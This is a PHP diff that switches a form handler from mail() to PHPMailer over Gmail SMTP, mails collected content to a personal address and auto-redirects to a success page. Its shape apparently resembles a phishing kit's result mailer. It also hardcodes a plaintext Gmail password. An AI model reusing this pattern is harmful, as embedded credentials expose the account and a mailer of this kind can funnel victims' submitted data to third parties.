@@ -117,24 +117,49 @@ Subscribe Hans Farhan
 </div>
 </center>
 ';
-$headers  = 'MIME-Version: 1.0' . "\r\n";
-$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-$headers .= 'From: Subscribe Igo Galeri ['.$resultFlags.'] <igogaleri@gmail.com>' . "\r\n";
 
-//$from    = 'igogaleri@gmail.com';
-$to      = 'rizkipratama122019@gmail.com';
-//$headers  = 'MIME-Version: 1.0' . "\r\n";
-//$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
-//$headers .=
-//'From: ' . $from . "\r\n" .
-//'Reply-To: ' . $from . "\r\n" .
-//'X-Mailer: PHP/' . phpversion();
-$kirim = mail($to, $subjek, $pesan, $headers);
-if($kirim) {
+require('vendor/autoload.php');
+
+$mail = new PHPMailer;
+
+//Enable SMTP debugging. 
+$mail->SMTPDebug = 3;                               
+//Set PHPMailer to use SMTP.
+$mail->isSMTP();            
+//Set SMTP host name                          
+$mail->Host = "smtp.gmail.com";
+//Set this to true if SMTP host requires authentication to send email
+$mail->SMTPAuth = true;                          
+//Provide username and password     
+$mail->Username = "igogaleri@gmail.com";                 
+$mail->Password = "rumahku1988";                           
+//If SMTP requires TLS encryption then set it
+$mail->SMTPSecure = "tls";                           
+//Set TCP port to connect to 
+$mail->Port = 587;                                   
+
+$mail->From = "igogaleri@gmail.com";
+$mail->FromName = "Igo Galeri";
+
+$mail->addAddress("srihernogo@gmail.com", "Sri Hernogo");
+
+$mail->isHTML(true);
+
+$mail->Subject = $subjek;
+$mail->Body = $pesan;
+$mail->AltBody = "This is the plain text version of the email content";
+
+if(!$mail->send()) 
+{
+    echo "Mailer Error: " . $mail->ErrorInfo;
+} 
+else 
+{
 echo "<form id='shagitz' method='POST' action='success.php'>
 <input type='hidden' name='nickname' value='$nickname'>
 </form>
 <script type='text/javascript'>document.getElementById('shagitz').submit();</script>";
 }
+
 }
 ?>
